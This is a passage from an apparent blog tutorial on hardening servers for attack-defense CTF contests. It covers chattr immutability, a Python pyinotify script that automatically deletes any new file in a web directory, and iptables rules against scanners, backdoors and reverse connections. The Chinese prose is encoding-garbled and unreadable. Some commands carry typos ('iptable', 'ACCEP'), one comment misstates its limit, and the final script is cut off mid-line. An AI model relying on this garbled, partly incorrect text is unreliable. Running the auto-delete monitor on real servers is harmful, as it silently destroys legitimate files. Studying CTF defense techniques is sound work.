å‘½ä»¤</strong></p><p>linuxä¸‹çš„æ–‡ä»¶æœ‰ç€éšè—å±æ€§ï¼Œå¯ä»¥ç”¨lsattrå‘½ä»¤æŸ¥çœ‹ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªiå±æ€§ï¼Œè¡¨ç¤ºä¸å¾—æ›´åŠ¨ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ã€‚å¦‚æœä½ å·²ç»æœ‰rootæˆ–è€…sudoæƒé™äº†ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨â€chattr +i å‘½ä»¤â€ä¿®æ”¹æ–‡ä»¶éšè—å±æ€§ï¼Œè¿™æ ·æ‰€æœ‰ç”¨æˆ·éƒ½ä¸èƒ½å¯¹è¯¥æ–‡ä»¶æˆ–è€…ç›®å½•è¿›è¡Œä¿®æ”¹åˆ é™¤ç­‰æ“ä½œï¼ˆåŒ…æ‹¬rootï¼‰ï¼Œå¦‚æœæƒ³è¿›è¡Œä¿®æ”¹ï¼Œå¿…é¡»ç”¨å‘½ä»¤â€chattr -iâ€å–æ¶ˆéšè—å±æ€§ã€‚</p><p><a href="http://www.runoob.com/linux/linux-comm-chattr.html">Linuxæ–‡ä»¶ä¿æŠ¤ç¦æ­¢ä¿®æ”¹ã€åˆ é™¤ã€ç§»åŠ¨æ–‡ä»¶ç­‰,ä½¿ç”¨chattr +iä¿æŠ¤</a></p><p>ä¾‹å­ï¼š</p><p>ç”¨chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /etc/profile </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å°†&#x2F;var&#x2F;www&#x2F;htmlç›®å½•ä¸‹çš„æ–‡ä»¶è®¾ç½®ä¸ºä¸å…è®¸ä»»ä½•äººä¿®æ”¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr -R +i /var/www/html </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ2ï¼‰è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿ</strong></p><p>pythonçš„ç¬¬ä¸‰æ–¹åº“pyinotifyå¯ä»¥è®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿åœ°å®ç°è¿™äº›åŠŸèƒ½ã€‚ä½†æ˜¯ç”±äºæ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œ<strong>çº¿ä¸‹èµ›ä¸­é€šå¸¸æ²¡æ³•è”ç½‘å®‰è£…åº“</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰‹å·¥æŠŠåº“æ–‡ä»¶ä¼ åˆ°é¶æœºé‡Œpythonåº“ä¸­: &#x2F;usr&#x2F;lib&#x2F;pythonXXX&#x2F;site-packagesï¼Œä½†æ˜¯æ›´æ–¹ä¾¿çš„åšæ³•æ˜¯å€Ÿç”¨pyinstallerç­‰å·¥å…·å°†å…¶æ‰“åŒ…æˆlinuxå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>å®‰è£…äº†pyinotifyåº“ä¹‹åï¼Œæˆ‘ä»¬ä»…ä»…è¿è¡Œåœ¨æœºå™¨ä¸Šï¼š â€œpython -m pyinotify ç›‘æ§ç›®å½•è·¯å¾„â€ è¿™æ¡ç®€å•çš„å‘½ä»¤ï¼Œå°±å¯ä»¥çœ‹åˆ°å¯¹è¿™ä¸ªç›®å½•ä»¥åŠè¯¥ç›®å½•ä¸‹æ‰€æœ‰è¿›è¡Œä»»ä½•æ“ä½œçš„çš„ç›‘æ§æ—¥å¿—ã€‚</p><p>ä½†ç”±äºç›‘æ§äº‹ä»¶å¤ªè¿‡æ‚ï¼Œå¾ˆå¤šå¹¶ä¸æ˜¯æˆ‘ä»¬å…³æ³¨çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸ä»…ä»…è¦ç›‘æ§ï¼Œè¿˜éœ€è¦å¯¹æŸäº›æ“ä½œè¿›è¡Œè‡ªåŠ¨å¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªå·±ç¼–ç¨‹ï¼Œé’ˆå¯¹æ€§åœ°å®ç°æˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½ï¼Œä¸‹é¢æ˜¯ä¸€æ®µä»£ç ç¤ºä¾‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> WatchManager, Notifier,ProcessEvent</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> IN_DELETE, IN_CREATE,IN_MOVED_TO,IN_ATTRIB</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EventHandler</span>(<span class="title class_ inherited__">ProcessEvent</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;äº‹ä»¶å¤„ç†&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#åˆ›å»º</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_CREATE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Create : &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line">        <span class="comment">#åˆ é™¤</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_DELETE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Delete : &quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#æ–‡ä»¶å±æ€§è¢«ä¿®æ”¹ï¼Œå¦‚chmodã€chownå‘½ä»¤</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_ATTRIB</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Attribute been modified:&quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#æ–‡ä»¶è¢«ç§»æ¥ï¼Œå¦‚mvã€cpå‘½ä»¤</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_MOVED_TO</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] File or dir been moved to here: &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteFileOrDir</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(target):</span><br><span class="line">        fileslist = os.listdir(target)</span><br><span class="line">        <span class="keyword">for</span> files <span class="keyword">in</span> fileslist:</span><br><span class="line">            DeleteFileOrDir(target + <span class="string">&quot;/&quot;</span> + files)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.rmdir(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete directory successfully: &quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete directory failed: &quot;</span> + target</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(target):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete file successfully&quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete file filed:  &quot;</span> + target</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Monitor</span>(<span class="params">path</span>):</span><br><span class="line">        wm = WatchManager()</span><br><span class="line">        mask = IN_DELETE | IN_CREATE | IN_MOVED_TO | IN_ATTRIB</span><br><span class="line">        notifier = Notifier(wm, EventHandler())</span><br><span class="line">        wm.add_watch(path, mask,rec=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Now Starting Monitor:  %s&#x27;</span>%(path)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        notifier.process_events()</span><br><span class="line">                        <span class="keyword">if</span> notifier.check_events():</span><br><span class="line">                                notifier.read_events()</span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                        notifier.stop()</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        usage=<span class="string">&quot;%(prog)s -w [path]&quot;</span>,</span><br><span class="line">        description=(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            Introduceï¼šSimple Directory Monitor!  by ssooking&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;--watch&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,dest=<span class="string">&quot;path&quot;</span>,default=<span class="string">&quot;/var/www/html/&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;directory to watch,default is /var/www/html&quot;</span>)</span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    Monitor(args.path) </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å…³äºpyinotify åº“çš„ç”¨æ³•ä¸å†èµ˜è¿°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘åœ¨ä¸Šè¿°ä»£ç ä¸­åˆ›å»ºäº†ä¸€ä¸ªäº‹ä»¶ç›‘æ§å¤„ç†çš„ç±»EventHandlerï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä»…ä»…å…³æ³¨åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹å±æ€§ã€ç§»åŠ¨æ“ä½œäº‹ä»¶ï¼Œå¹¶ä¸”æˆ‘å®šä¹‰äº†ä¸€ä¸ªDeleteFileOrDiræ–¹æ³•ç”¨äºè‡ªåŠ¨åˆ é™¤å¢åŠ çš„ç›®å½•æˆ–è€…æ–‡ä»¶ã€‚è¿è¡Œæµ‹è¯•æˆªå›¾ï¼š</p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™åŠŸèƒ½æ›´åŠ ç»†åŒ–çš„ç¨‹åºï¼Œå®ç°å¦‚ï¼š</p><p>ç›‘æ§æ–‡ä»¶å˜æ›´ï¼Œ</p><p>ç¦æ­¢åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤ä»»ä½•æ–‡ä»¶æˆ–ç›®å½•ï¼Œ</p><p>è‡ªåŠ¨åˆ é™¤æ–°å¢æ–‡ä»¶ï¼Œ</p><p>æŠŠè¢«ä¿®æ”¹çš„æ–‡ä»¶æ”¹å›å»,</p><p>åˆ é™¤ç•¸å½¢éšè—æ–‡ä»¶ç­‰åŠŸèƒ½ã€‚æˆ‘ä»¬ä½¿ç”¨pyinstalleræŠŠæˆ‘ä»£ç æ‰“åŒ…ä¸ºlinuxçš„elfå¯æ‰§è¡Œæ–‡ä»¶ã€‚-Få‚æ•°è¡¨ç¤ºæ‰“åŒ…ä¸ºç‹¬ç«‹å¯è¿è¡Œæ–‡ä»¶ï¼Œå‘½ä»¤æ‰§è¡Œå®Œä¹‹åè‡ªåŠ¨ç”Ÿæˆï¼šbuildã€distæ–‡ä»¶å¤¹å’ŒSimpleMonitor.specæ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨distç›®å½•é‡Œæ‰¾åˆ°ç”Ÿæˆçš„elfç¨‹åºã€‚</p><p>æ‰“åŒ…çš„æ–‡ä»¶åœ¨CTFDefenseé¡¹ç›®çš„Monitorç›®å½•ä¸‹</p><p><strong>4. ç½‘ç»œç›‘æ§æ–­å¼‚å¸¸è¿æ¥</strong></p><p>linuxå®‰å…¨é˜²æŠ¤ä¸€å®šå°‘ä¸äº† iptablesäº†ï¼Œä½¿ç”¨iptableséœ€è¦æœ‰ç®¡ç†å‘˜æƒé™ã€‚å¯¹äºæ¯”èµ›ç¯å¢ƒï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é…ç½®ä¸€ä¸ªè¿‘ä¹è‹›åˆ»çš„é…ç½®é˜²ç«å¢™ç­–ç•¥ã€‚</p><p>å…·ä½“æˆ‘ä»¬å¯ä»¥åšå“ªäº›å·¥ä½œå‘¢ï¼Œä¸¾ä¸€äº›ä¾‹å­ï¼š</p><p><strong>ï¼ˆ1ï¼‰å…³é—­æ‰€æœ‰ç½‘ç»œç«¯å£ï¼Œåªå¼€æ”¾ä¸€äº›æ¯”èµ›çš„å¿…è¦ç«¯å£ï¼Œä¹Ÿå¯ä»¥é˜²æ­¢åé—¨çš„è¿æ¥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¼€æ”¾ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#æ‰“å¼€80ç«¯å£</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#å¼€å¯å¤šç«¯å£ç®€å•ç”¨æ³•</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#å…è®¸å¤–éƒ¨è®¿é—®æœ¬åœ°å¤šä¸ªç«¯å£ å¦‚8080ï¼Œ8081ï¼Œ8082,ä¸”åªå…è®¸æ˜¯æ–°è¿æ¥ã€å·²ç»è¿æ¥çš„å’Œå·²ç»è¿æ¥çš„å»¶ä¼¸å‡ºæ–°è¿æ¥çš„ä¼šè¯</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ2ï¼‰é™åˆ¶sshç™»é™†ï¼Œè¿›è¡Œè®¿é—®æ§åˆ¶</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP ã€€ã€€//ç¦æ­¢ä»123.4.5.6è¿œç¨‹ç™»é™†åˆ°æœ¬æœº</span><br><span class="line">iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPTã€€ã€€//å…è®¸123.4.5.6ç½‘æ®µè¿œç¨‹ç™»é™†è®¿é—®ssh </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ3ï¼‰é™åˆ¶IPè¿æ¥æ•°å’Œè¿æ¥é€Ÿç‡</strong></p><p>æˆ‘ä»¬å¯ä»¥é™åˆ¶IPçš„ç½‘ç»œè¿æ¥æ•°å’Œé€Ÿåº¦ç­‰ï¼Œé™åˆ¶è¿‡å¿«çš„è¿æ¥é¢‘ç‡ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶å¯¹æ–¹çš„æ‰«æå™¨ã€‚ç‹ ä¸€ç‚¹çš„è¯ï¼Œç”šè‡³å¯ä»¥è®©å¯¹æ–¹åªèƒ½ä»¥æ‰‹å·¥ç‚¹ç½‘é¡µçš„é€Ÿåº¦ä¸è®¿é—®+_+</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å•ä¸ªIPçš„æœ€å¤§è¿æ¥æ•°ä¸º 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#å•ä¸ªIPåœ¨60ç§’å†…åªå…è®¸æœ€å¤šæ–°å»º15ä¸ªè¿æ¥</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#å…è®¸å¤–éƒ¨è®¿é—®æœ¬æœº80ç«¯å£ï¼Œä¸”æœ¬æœºåˆå§‹åªå…è®¸æœ‰10ä¸ªè¿æ¥ï¼Œæ¯ç§’æ–°å¢åŠ 2ä¸ªè¿æ¥ï¼Œå¦‚æœè®¿é—®è¶…è¿‡æ­¤é™åˆ¶åˆ™æ‹’æ¥ ï¼ˆæ­¤æ–¹å¼å¯ä»¥é™åˆ¶ä¸€äº›æ”»å‡»ï¼‰</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --limit-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å†çŒ¥çä¸€ç‚¹ï¼Œå¯ä»¥å®šæ—¶æ–­å¼€å·²ç»å»ºç«‹çš„è¿æ¥ï¼Œè®©å¯¹æ–¹åªèƒ½æ–­æ–­ç»­ç»­çš„è®¿é—®</p><p><strong>ï¼ˆ4ï¼‰æ•°æ®åŒ…ç®€å•è¯†åˆ«ï¼Œé˜²æ­¢ç«¯å£å¤ç”¨ç±»çš„åé—¨æˆ–è€…shell</strong></p><p>å‡è®¾ç—…æ¯’æœ¨é©¬ç¨‹åºé€šè¿‡22ï¼Œ80ç«¯å£å‘æœåŠ¡å™¨å¤–ä¼ é€æ•°æ®ï¼Œè¿™ç§æ–¹å¼å‘å‘å¤–å‘çš„æ•°æ®ä¸æ˜¯æˆ‘ä»¬é€šè¿‡è®¿é—®ç½‘é¡µè¯·æ±‚è€Œå›åº”çš„æ•°æ®åŒ…ã€‚æˆ‘ä»¬å¯ä»¥ç¦æ­¢è¿™äº›æ²¡æœ‰é€šè¿‡è¯·æ±‚å›åº”çš„æ•°æ®åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ5ï¼‰é™åˆ¶è®¿é—®</strong></p><p>å¦‚æœå¯¹æ–¹æ¥åŠ¿å¤ªå‡¶ï¼Œæˆ‘ä»¬å¯ä»¥é™åˆ¶æˆ–è€…å°æ€ä»–ä»¬çš„ipæ®µã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROPã€€ã€€//ç¦æ­¢ä»å®¢æˆ·æœº123.4.5.6è®¿é—®123.4.5.7ä¸Šçš„ä»»ä½•æœåŠ¡</span><br><span class="line"><span class="comment">#å°æ€123.4.5.6è¿™ä¸ªIPæˆ–è€…æŸä¸ªipæ®µ</span></span><br><span class="line">iptables -I INPUT -s 123.4.5.6 -j DROP</span><br><span class="line">iptables -I INPUT -s 123.4.5.1/24 -j DROP </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ6ï¼‰è¿‡æ»¤å¼‚å¸¸æŠ¥æ–‡</strong></p><p>iptablesæœ‰ä¸€ä¸ªTCPåŒ¹é…æ‰©å±•åè®®â€“tcp-flagsï¼ŒåŠŸèƒ½æ˜¯è¿‡æ»¤TCPä¸­çš„ä¸€äº›åŒ…ï¼Œæ¯”å¦‚SYNåŒ…ï¼ŒACKåŒ…ï¼ŒFINåŒ…ï¼ŒRSTåŒ…ç­‰ç­‰ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬çŸ¥é“SYNæ˜¯å»ºç«‹è¿æ¥ï¼ŒRSTæ˜¯é‡ç½®è¿æ¥ï¼Œå¦‚æœè¿™ä¸¤ä¸ªåŒæ—¶å‡ºç°ï¼Œå°±çŸ¥é“è¿™æ ·çš„åŒ…æ˜¯æœ‰é—®é¢˜çš„ï¼Œåº”è¯¥ä¸¢å¼ƒã€‚ä¸‹é¢çš„ä¾‹å­æ˜¯åˆ©ç”¨â€“tcp-flagså‚æ•°ï¼Œå¯¹ä¸€äº›åŒ…è¿›è¡Œæ ‡è¯†è¿‡æ»¤ï¼Œæ‰”æ‰å¼‚å¸¸çš„æ•°æ®åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">#è¡¨ç¤º SYN,FIN,ACK,RSTçš„æ ‡è¯†éƒ½æ£€æŸ¥ï¼Œä½†åªåŒ¹é…SYNæ ‡è¯†</span></span><br><span class="line">iptables -A INPUT -p tcp --syn ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ <span class="comment">#åŒ¹é…SYNæ ‡è¯†ä½</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP ã€€ã€€ã€€ã€€ã€€ <span class="comment">#æ£€æŸ¥æ‰€æœ‰çš„æ ‡è¯†ä½ï¼ŒåŒ¹é…åˆ°FIN URG PSHçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ <span class="comment">#ä¸¢å¼ƒæ²¡æ ‡å¿—ä½çš„åŒ…</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROPã€€<span class="comment">#åŒ¹é…åˆ°SYN ACK FIN URGçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROPã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">#åŒ¹é…åˆ°SYN ACK FIN RSTçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROPã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">#åŒ¹é…åˆ°SYN FIN PSHçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROPã€€ ã€€ã€€<span class="comment">#åŒ¹é…åˆ°SYN FIN RST PSHçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROPã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">#åŒ¹é…åˆ° SYN,RSTçš„ä¸¢å¼ƒ</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP ã€€ã€€ã€€ã€€ã€€ <span class="comment">#åŒ¹é…åˆ° SYN,FINçš„ä¸¢å¼ƒ </span></span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><strong>ï¼ˆ7ï¼‰é˜²DDOSæ”»å‡»</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line">ã€€ã€€-m <span class="built_in">limit</span>: å¯ç”¨<span class="built_in">limit</span>æ‰©å±•</span><br><span class="line">ã€€ã€€â€“<span class="built_in">limit</span> 20/minute: å…è®¸æœ€å¤šæ¯åˆ†é’Ÿ10ä¸ªè¿æ¥</span><br><span class="line">ã€€ã€€â€“limit-burst 100: å½“è¾¾åˆ°100ä¸ªè¿æ¥åï¼Œæ‰å¯ç”¨ä¸Šè¿°20/minuteé™åˆ¶ </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>ä¸¢å¼ƒé™Œç”Ÿçš„TCPå“åº”åŒ…,é˜²æ­¢åå¼¹å¼æ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>æ›´å¤šçš„å§¿åŠ¿ï¼Œéœ€è¦æ‰“å¼€æˆ‘ä»¬çš„è„‘æ´äº†ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªé€šç”¨çš„firewallè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ åˆ°æœåŠ¡å™¨ä¸Šä¸€é”®æ‰§è¡Œï¼Œç›¸å…³å‚æ•°å¯ä»¥æŸ¥é˜…èµ„æ–™è¯¦ç»†äº†è§£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Allow youself Ping other hosts , prohibit others Ping you</span></span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br><span class="line">iptables -A OUTPUT -p icmp 